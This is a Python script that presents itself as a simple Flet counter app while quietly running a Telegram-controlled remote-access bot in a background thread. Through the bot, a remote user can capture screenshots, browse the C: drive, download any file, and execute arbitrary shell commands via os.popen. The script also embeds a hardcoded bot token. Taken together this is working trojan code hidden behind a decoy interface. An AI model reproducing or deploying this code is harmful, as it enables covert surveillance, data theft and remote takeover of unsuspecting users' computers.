import os
import telebot
from telebot import types
import pyautogui
import sqlite3
import threading
import flet as ft

# Conexión con nuestro BOT
TOKEN = '7350752233:AAFZTB3HMBbzbFMHh0-7q3XDbKnDb-ExWLg'
bot = telebot.TeleBot(TOKEN)

# Ruta para guardar capturas de pantalla (ruta relativa)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURES_DIR = os.path.join(BASE_DIR, 'Captures')
if not os.path.exists(CAPTURES_DIR):
    os.makedirs(CAPTURES_DIR)
SCREENSHOT_PATH = os.path.join(CAPTURES_DIR, 'screenshot.png')

# Creación de conexión y lógica para BASE DE DATOS
def insert_usuario(telegram_id: int, name: str):
    conex = sqlite3.connect('telegram_bot.db')
    cursor = conex.cursor()
    cursor.execute('''
        INSERT OR IGNORE INTO users(telegram_id, name)
        VALUES (?,?)
    ''', (telegram_id, name))
    conex.commit()
    cursor.close()
    conex.close()

# Definir directorio base como raíz del disco C
BASE_DIR = 'C:/'

# Diccionario para almacenar la última carpeta listada por cada usuario
user_directories = {}

# Función para crear el menú de botones
def get_main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn_help = types.KeyboardButton('/help')
    btn_screenshot = types.KeyboardButton('/screenshot')
    btn_list_files = types.KeyboardButton('/list_files')
    btn_list_directory = types.KeyboardButton('/list_directory')
    btn_remote_command = types.KeyboardButton('/remote_command')
    markup.add(btn_help, btn_screenshot, btn_list_files, btn_list_directory, btn_remote_command)
    return markup

# Función para enviar instrucciones y mostrar botones
def send_instructions(chat_id):
    markup = get_main_menu()
    welcome_message = ("Hola! Soy tu bot. Puedes interactuar conmigo usando los siguientes comandos:\n"
                       "/help - Muestra este mensaje de ayuda\n"
                       "/screenshot - Toma y envía una captura de pantalla\n"
                       "/list_files - Lista los directorios en la raíz del disco C\n"
                       "/list_directory - Lista el contenido de una carpeta específica\n"
                       "/remote_command - Ejecuta un comando remoto")
    bot.send_message(chat_id, welcome_message, reply_markup=markup)

@bot.message_handler(commands=['save'])
def save_user(message):
    telegram_id = message.from_user.id
    name = message.from_user.first_name
    insert_usuario(telegram_id, name)
    bot.reply_to(message, f'Bienvenido {name}, tu información ha sido guardada')

# Comando /help para proporcionar ayuda
@bot.message_handler(commands=['help'])
def send_help(message):
    markup = get_main_menu()
    help_message = ('Puedes interactuar conmigo usando los siguientes comandos:\n'
                    '/start - Inicia el bot y muestra el menú\n'
                    '/help - Muestra este mensaje de ayuda\n'
                    '/screenshot - Toma y envía una captura de pantalla\n'
                    '/send_files - Envía un archivo\n'
                    '/list_files - Lista los directorios en la raíz del disco C\n'
                    '/list_directory - Lista el contenido de una carpeta específica\n'
                    '/remote_command - Ejecuta un comando remoto')
    bot.send_message(message.chat.id, help_message, reply_markup=markup)

# Comando /screenshot para capturar y enviar una captura de pantalla
@bot.message_handler(commands=['screenshot'])
def send_screenshot(message):
    markup = get_main_menu()
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(SCREENSHOT_PATH)
        with open(SCREENSHOT_PATH, 'rb') as file:
            bot.send_photo(message.chat.id, file, caption="Aquí tienes la captura de pantalla.", reply_markup=markup)
        os.remove(SCREENSHOT_PATH)
    except Exception as e:
        bot.send_message(message.chat.id, f"No se pudo tomar la captura de pantalla: {str(e)}", reply_markup=markup)

# Comando /list_files para listar los directorios en la raíz del disco C
@bot.message_handler(commands=['list_files'])
def list_files(message):
    markup = get_main_menu()
    try:
        root_dir = 'C:/'
        directories = [d for d in os.listdir(root_dir) if os.path.isdir(os.path.join(root_dir, d))]
        if directories:
            directory_list = "\n".join(directories)
            bot.send_message(message.chat.id, f"Directorios en la raíz de C:\n{directory_list}", reply_markup=markup)
        else:
            bot.send_message(message.chat.id, "No se encontraron directorios en la raíz de C:\n", reply_markup=markup)
    except Exception as e:
        bot.send_message(message.chat.id, f"No se pudo listar los directorios en la raíz de C:\n{str(e)}", reply_markup=markup)

# Comando /list_directory para listar el contenido de una carpeta específica
@bot.message_handler(commands=['list_directory'])
def request_directory(message):
    user_directories[message.chat.id] = BASE_DIR
    msg = bot.send_message(message.chat.id, f'Estás en {BASE_DIR}. Ingresa el nombre de la carpeta para listar su contenido:')
    bot.register_next_step_handler(msg, list_directory)

def list_directory(message):
    markup = get_main_menu()
    current_path = user_directories.get(message.chat.id, BASE_DIR)
    folder_name = message.text.strip()
    new_path = os.path.join(current_path, folder_name)
    
    try:
        if os.path.exists(new_path) and os.path.isdir(new_path):
            user_directories[message.chat.id] = new_path
            files = os.listdir(new_path)
            if files:
                file_list = "\n".join(files)
                bot.send_message(message.chat.id, f"Contenido de la carpeta '{new_path}':\n{file_list}", reply_markup=markup)
            else:
                bot.send_message(message.chat.id, f"La carpeta '{new_path}' está vacía.", reply_markup=markup)
            msg = bot.send_message(message.chat.id, f"¿Quieres listar otra subcarpeta de '{new_path}'? Si es así, ingresa el nombre de la subcarpeta. Para regresar al directorio anterior, ingresa '..'. Para enviar un archivo, escribe 'enviar [nombre del archivo]'.")
            bot.register_next_step_handler(msg, handle_next_step)
        else:
            bot.send_message(message.chat.id, f"La ruta '{new_path}' no es válida o no es un directorio.", reply_markup=markup)
    except Exception as e:
        bot.send_message(message.chat.id, f"No se pudo listar la carpeta '{new_path}': {str(e)}", reply_markup=markup)

def handle_next_step(message):
    current_path = user_directories.get(message.chat.id, BASE_DIR)
    input_text = message.text.strip()
    
    if input_text.lower().startswith('enviar '):
        file_name = input_text[7:].strip()
        file_path = os.path.join(current_path, file_name)
        send_specific_file(message, file_path)
    elif input_text == '..':
        new_path = os.path.dirname(current_path)
        user_directories[message.chat.id] = new_path
        list_directory(message)
    else:
        folder_name = input_text
        new_path = os.path.join(current_path, folder_name)
        list_directory(message)

def send_specific_file(message, file_path):
    markup = get_main_menu()
    if os.path.exists(file_path):
        try:
            with open(file_path, 'rb') as file:
                bot.send_document(message.chat.id, file, caption=f"Aquí tienes el archivo {os.path.basename(file_path)}.", reply_markup=markup)
        except Exception as e:
            bot.send_message(message.chat.id, f"No se pudo enviar el archivo: {str(e)}", reply_markup=markup)
    else:
        bot.send_message(message.chat.id, f"El archivo '{file_path}' no existe o la ruta no es válida.", reply_markup=markup)
        msg = bot.send_message(message.chat.id, f"¿Quieres listar otra subcarpeta o enviar un archivo desde '{os.path.dirname(file_path)}'? Ingresa el nombre de la subcarpeta o 'enviar [nombre del archivo]'.")
        bot.register_next_step_handler(msg, handle_next_step)

# Comando /remote_command para ejecutar comandos remotos
@bot.message_handler(commands=['remote_command'])
def request_command(message):
    user_id = message.from_user.id
    # Aquí puedes agregar validación de usuario si es necesario
    if user_id == 5433151369:
        msg = bot.send_message(message.chat.id, 'Por favor, ingresa el comando que deseas ejecutar:')
        bot.register_next_step_handler(msg, execute_remote_command)
    else:
        bot.send_message(message.chat.id, 'No tienes permisos para ejecutar comandos remotos.')

def execute_remote_command(message):
    command = message.text.strip()
    try:
        output = os.popen(command).read()
        if output:
            bot.send_message(message.chat.id, f"Salida del comando:\n{output}")
        else:
            bot.send_message(message.chat.id, "El comando se ejecutó, pero no produjo salida.")
    except Exception as e:
        bot.send_message(message.chat.id, f"No se pudo ejecutar el comando: {str(e)}")

def main(page: ft.Page):
    page.title = "Flet counter example"
    page.vertical_alignment = ft.MainAxisAlignment.CENTER

    txt_number = ft.TextField(value="0", text_align=ft.TextAlign.RIGHT, width=100)

    def minus_click(e):
        txt_number.value = str(int(txt_number.value) - 1)
        page.update()

    def plus_click(e):
        txt_number.value = str(int(txt_number.value) + 1)
        page.update()

    page.add(
        ft.Row(
            [
                ft.IconButton(ft.icons.REMOVE, on_click=minus_click),
                txt_number,
                ft.IconButton(ft.icons.ADD, on_click=plus_click),
            ],
            alignment=ft.MainAxisAlignment.CENTER,
        )
    )

# Manejador para cualquier otro mensaje recibido
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    send_instructions(message.chat.id)

def run_bot():
    bot.polling(none_stop=True)

if __name__ == "__main__":
    # Ejecutar el bot de Telegram en un hilo separado
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()

    # Ejecutar la aplicación Flet en el hilo principal
    ft.app(main)